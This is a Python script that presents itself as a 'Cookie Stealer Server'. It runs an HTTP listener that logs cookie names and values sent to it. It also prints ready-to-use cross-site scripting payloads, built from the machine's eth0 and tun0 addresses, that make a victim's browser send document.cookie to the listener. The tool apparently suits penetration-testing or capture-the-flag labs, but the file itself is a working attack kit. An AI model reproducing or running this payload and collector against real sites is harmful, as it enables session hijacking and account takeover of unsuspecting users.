import http.server
import socketserver
from urllib.parse import urlparse, parse_qsl
from netifaces import interfaces, ifaddresses, AF_INET
import netifaces
from enum import Enum
from signal import signal, SIGINT
from sys import exit
import argparse

class colors(Enum):
    HEADER = '\033[95m'
    IBLUE = '\033[94m'
    ICYAN = '\033[96m'
    IGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    WHITE = "\033[1;37m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"

def printColored(color, text, end='\n'):
    col = [colors(c).value for c in colors if color == str(c.name).lower()]
    if not col:
        return None
    print(col[0] + text + colors.RESET.value, end=end)

def page(self):
    self.send_response(200)
    self.send_header("Content-Type", "text/html")
    self.end_headers()
    html = f"<html><head></head><body><h1>Recieved request</h1></body></html>"
    self.wfile.write(bytes(html, "utf8"))

class myHttpHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if "/?" in self.path:
            url = urlparse(self.path)
            host = self.headers.get('Host')
            # force "; " to & for better splits
            query = url.query.replace(";%20", "&")
            printColored("dark_gray", "*"*45)
            printColored("light_green", "Cookie Recieved.")
            if host:
                printColored("green", "Host:", end='')
                printColored("white", f"{host}")
            # Parse cookie in name=vlaue format
            x = dict(parse_qsl(query))  # splits on &
            for c in x:
                printColored("green", "Name: ", end='')
                printColored("white", f"{c}")
                printColored("green", "Value: ", end='')
                printColored("white", f"{x[c]}")
            printColored("green", "Full parameters: ", end='')
            printColored("white", f"{self.path}")
            page(self)

        if self.path == "/":
            page(self)
        return


def main():

    parser = argparse.ArgumentParser(description='Parse')
    parser.add_argument('-p','--port',help='Port to listen on', default='8082')
    args = parser.parse_args()

    print(args.port)

    PORT = int(args.port)

    def sighandler(signal_received, frame):
        # Handle any cleanup here
        print('SIGINT or CTRL-C detected. Exiting gracefully')
        httpd.server_close()
        exit(0)

    signal(SIGINT, sighandler)
    
    handler = myHttpHandler
    httpd = socketserver.TCPServer(("", PORT), handler)

    try:        
        printColored("dark_gray",  "\r\n" + "*"*20, end='')
        printColored("light_green", " Cookie Stealer Server ", end='')
        printColored("dark_gray", "*"*20)
        printColored("green", "\nHOST: ", end='')
        printColored("white", "localhost (127.0.0.1), ", end='')
        printColored("green", "PORT: ", end='')
        printColored("white", f"{PORT}")
        printColored("light_blue", "\nTest payloads for interfaces:")
        for iface in interfaces():
            if iface == "eth0":
                ip = addrs = netifaces.ifaddresses(iface)
                payloadStr = "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>"
                payloadStr = payloadStr.replace("IP", ip[2][0]['addr'])
                payloadStr = payloadStr.replace("PORT", str(PORT))
                printColored("green", "eth0: ", end='')
                printColored("white", payloadStr)
            if iface == "tun0":
                ip = addrs = netifaces.ifaddresses(iface)
                payloadStr = "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>"
                payloadStr = payloadStr.replace("IP", ip[2][0]['addr'])
                payloadStr = payloadStr.replace("PORT", str(PORT))
                printColored("green", "tun0: ", end='')
                printColored("white", payloadStr + "\n")
        printColored("yellow", "Waiting for requests...")
        httpd.serve_forever()
    except KeyboardInterrupt():
        httpd.server_close()


if __name__ == "__main__":
    main()
